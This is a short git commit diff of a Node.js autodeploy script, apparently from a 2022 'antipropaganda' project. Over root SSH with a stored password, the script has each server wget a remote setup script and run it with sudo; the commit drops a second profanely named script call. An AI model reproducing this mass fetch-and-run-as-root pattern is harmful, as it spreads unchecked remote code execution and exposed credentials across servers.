af6d1fbc0678b537716e81c90636206334db1a9b
cryptosebek <qu4ma@protonmail.com>
2022-03-03 15:26:13 +0200

    Autodeploy fix

--- autodeploy/index.js
+++ autodeploy/index.js
@@ -42,7 +42,7 @@ function intervalFunc() {
               r.password +
               "' ssh root@" +
               r.ip +
-              " touch ap && wget -O antipropaganda_setup.sh https://raw.githubusercontent.com/qu4ma/antipropaganda/main/antipropaganda_setup.sh && chmod +x antipropaganda_setup.sh && sudo ./antipropaganda_setup.sh && sudo ~/antipropaganda/fuckputin.sh &";
+              " touch ap && wget -O antipropaganda_setup.sh https://raw.githubusercontent.com/qu4ma/antipropaganda/main/antipropaganda_setup.sh && chmod +x antipropaganda_setup.sh && sudo ./antipropaganda_setup.sh &";
             console.log(cmd);
             exec(cmd, (error, stdout, stderr) => {
               if (error) {
